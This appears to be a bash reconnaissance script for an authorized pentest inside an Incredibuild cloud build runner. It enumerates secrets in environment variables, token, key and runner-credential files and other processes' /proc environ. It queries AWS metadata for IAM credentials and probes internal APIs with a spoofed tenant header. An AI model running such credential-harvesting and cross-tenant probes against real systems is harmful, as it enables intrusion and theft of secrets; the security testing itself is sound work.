#!/usr/bin/env bash
# Authorized pentest — Incredibuild cloud Build Runner in-runner recon.
# NON-DESTRUCTIVE: read-only enumeration + bounded connectivity probes. No writes outside $GITHUB_WORKSPACE.
set +e
CANARY="IBPT-RUNNER-CANARY-8842"
sec(){ echo; echo "==================== $* ===================="; }
cap(){ timeout 20 "$@" 2>&1 | head -c 8000; echo; }
echo "### $CANARY recon start $(date -u +%FT%TZ)"

sec "1. IDENTITY / CONTEXT"
cap id; cap whoami; cap hostname; cap uname -a; cap cat /etc/os-release; echo "PWD=$PWD"; cap uptime
echo "-- can we sudo without password? (capability check only)"; timeout 8 sudo -n true 2>&1 && echo "SUDO_NOPASSWD=YES" || echo "SUDO_NOPASSWD=no"

sec "2. PROCESSES / LISTENERS (Incredibuild daemons?)"
cap ps aux
echo "-- listening sockets --"; cap cap ss -tlnp
echo "-- IB-related processes --"; ps aux 2>/dev/null | grep -iE 'incredi|ib_|buildservice|coordinator|helper|agent|xoreax' | grep -v grep

sec "3. MOUNTS / DISKS (shared volumes, other-tenant leakage?)"
cap mount; cap df -h

sec "4. ENV VARS (secret exposure to workflow/runner — check masking)"
# our own tenant; safe to view. Look for IB/cloud/registration secrets injected into the job env.
env | sort | sed -E 's/(TOKEN|SECRET|KEY|PASSWORD|PWD|CRED)=.{6}.*/\1=<REDACTED-len>/I'
echo "-- explicit interesting var NAMES present (values redacted above) --"
env | grep -iE 'incredi|ib_|broker|coordinator|grid|tenant|descope|aws|azure|github_token|actions_runtime|registration' | cut -d= -f1 | sort -u

sec "5. INCREDIBUILD FOOTPRINT ON DISK (config, tokens, certs, keys)"
for d in /incredibuild /opt/incredibuild /etc/incredibuild /var/lib/incredibuild /usr/local/incredibuild "$HOME/.incredibuild"; do
  [ -e "$d" ] && { echo "## $d"; ls -la "$d" 2>/dev/null | head -40; }
done
echo "-- filesystem-wide IB name search (bounded) --"
timeout 25 find / -iname '*incredibuild*' -o -iname 'ib_*' 2>/dev/null | grep -vE '^/proc|^/sys' | head -60
echo "-- registration/broker tokens or agent config on disk --"
timeout 25 find / \( -iname '*.token' -o -iname 'agent*.conf' -o -iname 'coordinator*.conf' -o -iname '*broker*' -o -iname 'registration*' \) 2>/dev/null | grep -vE '^/proc|^/sys' | head -40
echo "-- TLS certs/keys (check for shared default cert 'CN=TEMP INCREDIBUILD' + world-readable keys) --"
for f in $(timeout 25 find / \( -iname '*.key' -o -iname '*.pem' -o -iname '*.crt' -o -iname '*.pfx' \) 2>/dev/null | grep -iE 'incredi|agent|coordinator|helper' | head -20); do
  echo "CERT/KEY: $f  perms=$(stat -c '%A %U:%G' "$f" 2>/dev/null)"
  case "$f" in *.crt|*.pem) timeout 8 openssl x509 -in "$f" -noout -subject -issuer 2>/dev/null;; esac
done

sec "6. GITHUB ACTIONS RUNNER CREDS (self-hosted runner registration/creds on box)"
echo "-- GITHUB_TOKEN present? scope? --"; [ -n "$GITHUB_TOKEN" ] && echo "GITHUB_TOKEN len=${#GITHUB_TOKEN}" || echo "no GITHUB_TOKEN env"
timeout 20 find / \( -name '.credentials' -o -name '.runner' -o -name '*.creds' -o -path '*_diag*' \) 2>/dev/null | grep -viE '^/proc|^/sys' | head -30
echo "-- other processes' environ readable? (cross-process secret leak) --"
for p in $(ps -eo pid= 2>/dev/null | head -40); do
  if [ -r "/proc/$p/environ" ] && [ "$p" != "$$" ]; then
    hit=$(tr '\0' '\n' < "/proc/$p/environ" 2>/dev/null | grep -iE 'token|secret|key|broker|tenant' | head -3)
    [ -n "$hit" ] && { echo "PID $p ($(cat /proc/$p/comm 2>/dev/null)) leaks:"; echo "$hit" | sed -E 's/=.{4}.*/=<redacted>/'; }
  fi
done

sec "7. RUNNER -> GRID/CLOUD TRUST + EGRESS (bounded connectivity)"
echo "-- reach IB control plane --"
cap curl -sS -m 8 -o /dev/null -w 'api.incredibuild.com -> HTTP %{http_code}\n' https://api.incredibuild.com/hosted_grids/
cap curl -sS -m 8 -o /dev/null -w 'cloudapi.incredibuild.com:443 -> %{http_code}\n' https://cloudapi.incredibuild.com/
echo "-- is the INTERNAL runner_instances API reachable from inside the runner? (404 on public host) --"
cap curl -sS -m 8 -w '\n[HTTP %{http_code}]\n' 'https://api.incredibuild.com/runner_instances/internal/active'
echo "-- from-inside: do x-public-tenant-id headers work here (internal auth context)? --"
cap curl -sS -m 8 -H 'x-public-tenant-id: 50e92188-9c70-4a30-937f-3cf4b51cf5d0' -w '\n[HTTP %{http_code}]\n' 'https://api.incredibuild.com/runner_instances/'
echo "-- cloud metadata (IMDS) reachability — LIST role only, DO NOT fetch key material --"
cap curl -sS -m 5 -o /dev/null -w 'IMDSv1 169.254.169.254 -> HTTP %{http_code}\n' http://169.254.169.254/latest/meta-data/
TOK=$(timeout 5 curl -sS -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null)
[ -n "$TOK" ] && cap curl -sS -m 5 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/
echo "-- coordinator ports (self-hosted model uses 31104) reachable to any host? --"
cap curl -sS -m 5 -o /dev/null -w 'localhost:31104 -> %{http_code}\n' http://127.0.0.1:31104/

sec "8. ISOLATION / PERSISTENCE (leftovers from other runs/tenants)"
echo "-- /tmp, /home, cache dirs for other-run/tenant residue --"
cap ls -la /tmp
cap ls -la /home 2>/dev/null
for c in /incredibuild/cache /var/cache/incredibuild "$HOME/.cache/incredibuild"; do [ -e "$c" ] && { echo "## cache $c"; ls -la "$c" | head; }; done
echo "-- any UUIDs on disk that are NOT our tenant dbe9a3ae (cross-tenant residue)? --"
timeout 15 grep -rslE 'tenant|grid' /incredibuild /tmp 2>/dev/null | head -5

sec "9. INJECTION RECON (how ib_console_flags/profile reach the build)"
echo "-- IB process command lines (are console flags passed on argv / env?) --"
for p in $(pgrep -f -iE 'incredi|ib_|buildservice' 2>/dev/null | head -10); do echo "PID $p: $(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 400)"; done

echo; echo "### $CANARY recon end $(date -u +%FT%TZ)"
